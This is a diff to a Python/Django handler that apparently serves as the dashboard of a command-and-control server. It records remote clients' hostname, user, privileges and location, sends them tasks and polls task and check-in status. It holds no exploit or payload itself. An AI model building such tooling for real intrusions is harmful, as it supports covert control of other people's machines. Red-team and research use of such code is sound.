@@ -32,8 +32,16 @@ class ControlServerHandler():
                            os_version=client_data['os_version'],
                            hostname=client_data['hostname'],
                            host_user=client_data['host_user'],
-                           privileges=client_data['privileges'])
+                           privileges=client_data['privileges'],
+                           first_seen_date=client['first_seen'][0:10],
+                           first_seen_time=client['first_seen'][11:19],
+                           last_seen_date=client['last_seen'][0:10],
+                           last_seen_time=client['last_seen'][11:19])
                 c.save()
+            else:
+                Client.objects.filter(client_id=client['_id']) \
+                              .update(last_seen_date=client['last_seen'][0:10],
+                                      last_seen_time=client['last_seen'][11:19])
 
     def getClients(self):
         requestUrl = "https://" + self.url + self.prefix + "/admin/allclients"
@@ -50,7 +58,9 @@ class ControlServerHandler():
 
     def getStatistics(self):
         num_clients = Client.objects.all().count()
-        top_os = Client.objects.annotate(c=Count('os_name')).order_by('-c').first().os_name
+        top_os = 'None'
+        if num_clients > 0:
+            top_os = Client.objects.annotate(c=Count('os_name')).order_by('-c').first().os_name
         statistics = {'num_clients': num_clients,
                       'top_os': top_os,
                       'errors': self.errors}
@@ -75,7 +85,7 @@ class ControlServerHandler():
                     }
                     locations.append(clientLocation)
             except Exception as e:
-                print(e)
+                print(f'IP could not be converted to location: {e}')
 
         summarized_locations = []
         processed_locations = []
@@ -156,6 +166,65 @@ class ControlServerHandler():
                 else:
                     SentTask.objects.filter(task_id=t_id).update(status=task['status'].replace("_", " "))
 
+    def getUpdatedTaskStatus(self):
+        requestUrl = "https://" + self.url + self.prefix + "/admin/task"
+        requestHeaders = {'Authorization': self.authorization}
+
+        data = {
+            "id": "",
+        }
+        response = requests.get(url=requestUrl, headers=requestHeaders, params=data)
+
+        updated_tasks = []
+
+        status_code = response.status_code
+        if status_code == 200:
+            sent_tasks = response.json()['sent_tasks'][0]
+            for task in sent_tasks:
+                t_id = task['_id']['task_id'] + task['_id']['client_id']
+                if (SentTask.objects.filter(task_id=t_id).exists()):
+                    t_sent_status = task['status'].replace("_", " ")
+                    t_current_status = SentTask.objects.get(task_id=t_id).status
+                    if t_sent_status != t_current_status:
+                        our_id = SentTask.objects.get(task_id=t_id).id
+                        SentTask.objects.filter(task_id=t_id).update(status=t_sent_status)
+                        new_updated_task = {
+                            'id': our_id,
+                            'task_id': t_id,
+                            'new_status': t_sent_status
+                        }
+                        updated_tasks.append(new_updated_task)
+
+        return updated_tasks
+
+    def getUpdatedClientStatus(self):
+        requestUrl = "https://" + self.url + self.prefix + "/admin/allclients"
+        requestHeaders = {'Authorization': self.authorization}
+        r = requests.get(url=requestUrl, headers=requestHeaders)
+
+        try:
+            clients = r.json()['all_clients']
+            updated_clients = []
+            for client in clients:
+                client_id = client['_id']
+                new_last_seen_date = client['last_seen'][0:10]
+                new_last_seen_time = client['last_seen'][11:19]
+                if (Client.objects.filter(client_id=client_id).exists()):
+                    c = Client.objects.get(client_id=client_id)
+                    if c.last_seen_date != new_last_seen_date or c.last_seen_time != new_last_seen_time:
+                        c.last_seen_date = new_last_seen_date
+                        c.last_seen_time = new_last_seen_time
+                        new_c = {
+                            'client_id': client_id,
+                            'new_last_seen_date': new_last_seen_date,
+                            'new_last_seen_time': new_last_seen_time
+                        }
+                        updated_clients.append(new_c)
+            return updated_clients
+        except ValueError as e:
+            print("Server issues" + str(e))
+            return []
+
     def sendTasks(self, request):
         client_ids = request.POST.getlist('select')
         task_t = request.POST.getlist('option')[0]
@@ -199,12 +268,13 @@ class ControlServerHandler():
         task_ids = list(SentTask.objects.filter(id__in=selected).values_list('task_id', flat=True))
         selected_client_ids = list(SentTask.objects.filter(task_id__in=task_ids).values_list('client_id', flat=True))
         client_ids = list(Client.objects.filter(id__in=selected_client_ids).values_list('client_id', flat=True))
+        true_task_ids = [id[:len(id)//2] for id in task_ids]
 
         requestUrl = "https://" + self.url + self.prefix + "/admin/task"
         requestHeaders = {'Authorization': self.authorization}
 
         client_ids_str = (', ').join(client_ids)
-        task_ids_str = (', ').join(task_ids)
+        task_ids_str = (',').join(true_task_ids)
 
         data = {
             "client_id": client_ids_str,
